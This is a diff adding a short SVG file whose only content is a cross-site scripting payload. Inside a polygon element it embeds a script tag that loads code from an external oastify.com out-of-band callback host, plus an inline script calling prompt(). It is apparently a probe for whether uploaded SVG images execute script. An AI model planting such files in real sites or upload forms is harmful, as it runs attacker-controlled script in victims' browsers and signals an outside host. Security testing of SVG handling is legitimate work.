@@ -1,0 +1,10 @@
+<svg        
+xmlns="http://www.w3.org/2000/svg"        
+xmlns:xlink="http://www.w3.org/1999/xlink">
+<polygon id="triangle" points="50,0 50,50 50,0" fill="#009900" stroke="#004400"/>  
+<script xlink:href="https://tgd3mwf9y0u8von97z1804kptgz7nw.oastify.com}" />
+<script>       
+       prompt();            
+</script> 
+</polygon>  
+</svg>
